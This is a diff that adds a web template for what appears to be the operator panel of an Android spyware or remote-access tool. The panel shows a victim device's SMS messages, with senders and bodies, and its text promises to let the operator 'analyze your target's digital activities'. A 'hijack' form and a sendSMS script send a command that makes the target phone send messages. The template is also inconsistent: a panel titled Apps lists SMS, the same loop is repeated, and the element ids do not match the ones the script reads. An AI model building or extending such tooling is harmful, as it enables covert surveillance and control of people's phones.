@@ -1,0 +1,192 @@
+
+
+<div class="recent-sales box overflow">
+    <div class="title">Apps</div>
+    <div class="sales-details">
+
+        <ul class="details">
+            <li class="topic">Action</li>
+
+            <% pageData.forEach((smsData) => { 
+                let date = new Date(parseInt(smsData.date));
+                let status = {
+                    "updown": "question",
+                    "action": ""
+                };
+                if(smsData.type === "1") status = {
+                    "updown": "down",
+                    "action": "Recieved From "
+                };
+                if(smsData.type === "2") status = {
+                    "updown": "up",
+                    "action": "Sent To "
+                };
+            %>
+
+                   <li><a href="#"><%= status.action %></a></li>
+
+                <% }) %>
+
+        </ul>
+
+        <ul class="details">
+            <li class="topic">Address</li>
+
+            <% pageData.forEach((smsData) => { 
+                let date = new Date(parseInt(smsData.date));
+                let status = {
+                    "updown": "question",
+                    "action": ""
+                };
+                if(smsData.type === "1") status = {
+                    "updown": "down",
+                    "action": "Recieved From "
+                };
+                if(smsData.type === "2") status = {
+                    "updown": "up",
+                    "action": "Sent To "
+                };
+            %>
+
+                   <li><a href="?filter=<%= smsData.address %>"><%= smsData.address %></a></li>
+
+                <% }) %>
+
+        </ul>
+
+        <ul class="details">
+            <li class="topic">Date</li>
+
+            <% pageData.forEach((smsData) => { 
+                let date = new Date(parseInt(smsData.date));
+                let status = {
+                    "updown": "question",
+                    "action": ""
+                };
+                if(smsData.type === "1") status = {
+                    "updown": "down",
+                    "action": "Recieved From "
+                };
+                if(smsData.type === "2") status = {
+                    "updown": "up",
+                    "action": "Sent To "
+                };
+            %>
+
+                   <li><a href="#"><%= date.toLocaleString('en-GB', { timeZone: 'UTC' }) %></a></li>
+
+                <% }) %>
+
+        </ul>
+
+        <ul class="details">
+            <li class="topic">Content</li>
+
+            <% pageData.forEach((smsData) => { 
+                let date = new Date(parseInt(smsData.date));
+                let status = {
+                    "updown": "question",
+                    "action": ""
+                };
+                if(smsData.type === "1") status = {
+                    "updown": "down",
+                    "action": "Recieved From "
+                };
+                if(smsData.type === "2") status = {
+                    "updown": "up",
+                    "action": "Sent To "
+                };
+            %>
+
+                   <li><a href="#"><%= smsData.body %></a></li>
+
+                <% }) %>
+
+        </ul>
+
+    </div>
+
+    <button style="background: rgb(11, 0, 107); color: white; border-style: none; padding: 7px;" onclick="updateButton(this, '0xSM', {'action': 'ls'})">Update</button>
+
+
+
+    </div>
+
+
+    <div class="top-sales box">
+      <div class="title">About</div>
+      <ul class="top-sales-details">
+        <li>
+        <a href="#">
+          <!--<img src="images/sunglasses.jpg" alt="">-->
+          <span class="product">
+This feature enables you to see a list of all apps installed on your target device. So you must know which applications your target is using. Using this feature you can analyze your target’s digital activities.</span>
+        </a>
+      </li>
+      </ul>
+
+      <div class="button">
+        <a href="#">Learn More</a>
+      </div>
+
+      <div class="field">
+        <h1>to</h1>
+        <textarea style="background-color: #2f2f2f !important; padding: 10px; border-style: none; border-radius: 7px; color: white;" id="hijack"></textarea>
+        <h1>sms</h1>
+        <textarea style="background-color: #2f2f2f !important; padding: 10px; border-style: none; border-radius: 7px; color: white;" id="hijack"></textarea>
+    </div>
+    <button style="background-color: #2f2f2f !important; width: 60px; padding: 10px; border-style: none; border-radius: 7px; color: white;" class="ui button fluid positive" type="submit" onclick="sendSMS(this)">
+        Send
+    </button>
+
+
+</div>
+
+
+
+    </div>
+
+
+    
+
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    $('.menu .item').tab();
+    function sendSMS(element) {
+        $(element).addClass('loading')
+        sendCommand('0xSM', {
+            'action': 'sendSMS',
+            'sms': $('#sms').val(),
+            'to': $('#to').val()
+        }, (error, message) => {
+            if (error) {
+                setTimeout(() => {
+                    showNotification('#f03434', error)
+                    $(element).removeClass('loading')
+                }, 300)
+            } else {
+                setTimeout(() => {
+                    $(element).removeClass('loading');
+                    if (message === 'Requested') showNotification('#2ecc71', 'SMS Sent');
+                    else showNotification('#2ecc71', message);
+                }, 300)
+            }
+        });
+    }
+</script>
